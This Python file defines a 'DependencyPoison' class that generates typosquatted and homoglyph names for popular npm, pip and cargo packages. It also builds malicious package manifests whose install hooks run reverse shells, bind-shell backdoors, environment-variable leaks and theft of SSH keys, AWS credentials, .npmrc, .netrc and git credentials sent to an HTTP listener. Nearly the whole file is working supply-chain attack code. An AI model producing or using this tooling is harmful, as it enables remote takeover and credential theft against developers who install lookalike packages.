import random
import string


class DependencyPoison:
    POPULAR_PACKAGES = {
        "npm": [
            "lodash", "chalk", "react", "express", "axios", "moment", "uuid",
            "bluebird", "request", "colors", "commander", "async", "debug",
            "fs-extra", "babel-core", "webpack", "tslib", "glob", "yargs",
            "mkdirp", "rimraf", "dotenv", "inquirer", "body-parser",
        ],
        "pip": [
            "requests", "urllib3", "boto3", "awscli", "numpy", "pandas",
            "django", "flask", "pillow", "scipy", "scikit-learn", "tensorflow",
            "pytorch", "sphinx", "pytest", "celery", "redis", "sqlalchemy",
            "beautifulsoup4", "lxml", "cryptography", "bcrypt", "jwt",
        ],
        "cargo": [
            "serde", "tokio", "rand", "regex", "clap", "reqwest", "serde_json",
            "chrono", "rayon", "log", "env_logger", "thiserror", "anyhow",
            "futures", "hyper", "actix-web", "warp", "axum", "tracing",
        ],
    }

    def __init__(self):
        self.rand = random.Random()

    def typo_squat(self, package_name, strategy="auto"):
        strategies = ["swap", "insert", "omit", "repeat", "homoglyph", "tld"]
        if strategy == "auto":
            strategy = self.rand.choice(strategies)

        if strategy == "swap":
            if len(package_name) < 3:
                return package_name
            idx = self.rand.randint(0, len(package_name) - 2)
            lst = list(package_name)
            lst[idx], lst[idx + 1] = lst[idx + 1], lst[idx]
            return "".join(lst)

        elif strategy == "insert":
            extra = self.rand.choice(string.ascii_lowercase)
            idx = self.rand.randint(0, len(package_name))
            return package_name[:idx] + extra + package_name[idx:]

        elif strategy == "omit":
            if len(package_name) < 3:
                return package_name
            idx = self.rand.randint(0, len(package_name) - 1)
            return package_name[:idx] + package_name[idx + 1:]

        elif strategy == "repeat":
            if len(package_name) < 2:
                return package_name
            idx = self.rand.randint(0, len(package_name) - 1)
            return package_name[:idx] + package_name[idx] + package_name[idx:]

        elif strategy == "homoglyph":
            homoglyphs = {
                "a": "àáâãäå", "c": "çćč", "e": "èéêëė", "i": "ìíîï",
                "l": "ł", "n": "ñń", "o": "òóôõö", "s": "śšş",
                "u": "ùúûü", "y": "ýÿ", "z": "źżž",
                "0": "ο", "1": "l", "3": "З", "4": "h", "5": "ѕ",
                "6": "б", "8": "В", "9": "ɡ",
            }
            for i, ch in enumerate(package_name):
                if ch in homoglyphs:
                    return package_name[:i] + self.rand.choice(homoglyphs[ch]) + package_name[i + 1:]
            return package_name

        return package_name

    def generate_confusion_package(self, original_name, ecosystem="npm", payload_type="reverse_shell", lhost="127.0.0.1", lport=4444):
        payloads = {
            "npm": {
                "reverse_shell": self._npm_revshell(lhost, lport),
                "env_leak": self._npm_env_leak(),
                "cred_harvest": self._npm_cred_harvest(),
                "crypto_miner": self._npm_crypto_miner(),
                "backdoor": self._npm_backdoor(),
            },
            "pip": {
                "reverse_shell": self._pip_revshell(lhost, lport),
                "env_leak": self._pip_env_leak(),
                "cred_harvest": self._pip_cred_harvest(),
                "crypto_miner": self._pip_crypto_miner(),
                "backdoor": self._pip_backdoor(),
            },
            "cargo": {
                "reverse_shell": self._cargo_revshell(lhost, lport),
                "env_leak": self._cargo_env_leak(),
                "cred_harvest": self._cargo_cred_harvest(),
            },
        }
        ecosystem_payloads = payloads.get(ecosystem, payloads["npm"])
        payload_code = ecosystem_payloads.get(payload_type, ecosystem_payloads["reverse_shell"])
        return self._package_template(original_name, ecosystem, payload_code, payload_type)

    def _package_template(self, name, ecosystem, payload, payload_type):
        if ecosystem == "npm":
            return json.dumps({
                "name": name,
                "version": "99.99.99",
                "description": f"{name} — {payload_type}",
                "main": "index.js",
                "scripts": {
                    "preinstall": f"node -e \"{payload}\"",
                    "install": f"node -e \"{payload}\"",
                    "postinstall": f"node -e \"{payload}\"",
                },
                "author": "",
                "license": "MIT",
            }, indent=2)
        elif ecosystem == "pip":
            return f'''from setuptools import setup
from setuptools.command.install import install
import subprocess
import os


class PostInstall(install):
    def run(self):
        {payload}
        install.run(self)


setup(
    name="{name}",
    version="99.99.99",
    packages=[],
    cmdclass={{'install': PostInstall}},
)
'''
        elif ecosystem == "cargo":
            return f'''[package]
name = "{name}"
version = "99.99.99"
edition = "2021"

[dependencies]

[build-dependencies]

[[bin]]
name = "{name}"
path = "src/main.rs"
'''
        return f"# {name}: {ecosystem} package with {payload_type}\n{payload}"

    def _npm_revshell(self, lhost, lport):
        return (f"var net=require('net'),sp=require('child_process'),"
                f"c=net.connect({lport},'{lhost}');"
                f"sp.exec('/bin/bash -i',function(e,o,es){{c.write(o+es);c.end()}});"
                f"c.pipe(sp.stdin);")

    def _npm_env_leak(self):
        return "var env=JSON.stringify(process.env);require('http').get('http://127.0.0.1:8888/?env='+Buffer.from(env).toString('base64'));"

    def _npm_cred_harvest(self):
        return ("var fs=require('fs');var home=process.env.HOME||process.env.USERPROFILE;"
                "var targets=['.ssh/id_rsa','.aws/credentials','.npmrc','.git-credentials','.netrc'];"
                "targets.forEach(function(f){try{var d=fs.readFileSync(home+'/'+f,'utf8');"
                "require('http').get('http://127.0.0.1:8888/steal?f='+f+'&d='+Buffer.from(d).toString('base64'));}catch(e){}});")

    def _npm_crypto_miner(self):
        return "// crypto miner stub — replace with wasm miner\nconsole.log('miner placeholder');"

    def _npm_backdoor(self):
        return ("var cp=require('child_process');"
                "var net=require('net');"
                "var s=net.createServer(function(c){c.on('data',function(d){cp.exec(d.toString().trim(),function(e,o){c.write(o);});});});"
                "s.listen(1337,'127.0.0.1');")

    def _pip_revshell(self, lhost, lport):
        return f"subprocess.run(['/bin/bash','-c','bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'],capture_output=True)"

    def _pip_env_leak(self):
        return ("import os,urllib.request;"
                "env=urllib.parse.quote(str(dict(os.environ)));"
                "urllib.request.urlopen('http://127.0.0.1:8888/?env='+env)")

    def _pip_cred_harvest(self):
        return ("import os,urllib.request;"
                "home=os.path.expanduser('~');"
                "targets=['.ssh/id_rsa','.aws/credentials','.netrc','.git-credentials'];"
                "for t in targets:"
                "try:"
                "f=open(home+'/'+t);d=f.read();f.close();"
                "urllib.request.urlopen('http://127.0.0.1:8888/steal?f='+t+'&d='+__import__('base64').b64encode(d.encode()).decode())"
                "except:pass")

    def _pip_crypto_miner(self):
        return 'print("crypto miner placeholder")'

    def _pip_backdoor(self):
        return ("import socket,subprocess,os;"
                "s=socket.socket();s.bind(('127.0.0.1',1337));s.listen(5);"
                "while 1:"
                "c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);"
                "subprocess.call(['/bin/bash','-i'])")

    def _cargo_revshell(self, lhost, lport):
        return f'''fn main() {{
    use std::process::Command;
    Command::new("/bin/bash")
        .arg("-c")
        .arg("bash -i >& /dev/tcp/{lhost}/{lport} 0>&1")
        .status()
        .unwrap();
}}'''

    def _cargo_env_leak(self):
        return '''fn main() {
    let env = std::env::vars().map(|(k,v)| format!("{}={}",k,v)).collect::<Vec<_>>().join("\\n");
    let _ = std::process::Command::new("curl")
        .arg("-s")
        .arg(format!("http://127.0.0.1:8888/?env={}", base64::encode(env)))
        .status();
}'''

    def _cargo_cred_harvest(self):
        return '''fn main() {
    let home = std::env::var("HOME").unwrap_or_default();
    let targets = vec![".ssh/id_rsa", ".aws/credentials", ".netrc"];
    for t in targets {
        if let Ok(data) = std::fs::read_to_string(format!("{}/{}", home, t)) {
            let _ = std::process::Command::new("curl")
                .arg("-s")
                .arg(format!("http://127.0.0.1:8888/steal?f={}", t))
                .status();
        }
    }
}'''

    def generate_squat_list(self, ecosystem="npm", count=10):
        base_packages = self.POPULAR_PACKAGES.get(ecosystem, self.POPULAR_PACKAGES["npm"])
        strategies = ["swap", "insert", "omit", "repeat", "homoglyph"]
        squats = []
        for _ in range(min(count, len(base_packages) * 3)):
            pkg = self.rand.choice(base_packages)
            strat = self.rand.choice(strategies)
            squat = self.typo_squat(pkg, strat)
            if squat != pkg and squat not in [s["squat"] for s in squats]:
                squats.append({"original": pkg, "squat": squat, "strategy": strat})
        return squats[:count]


import json
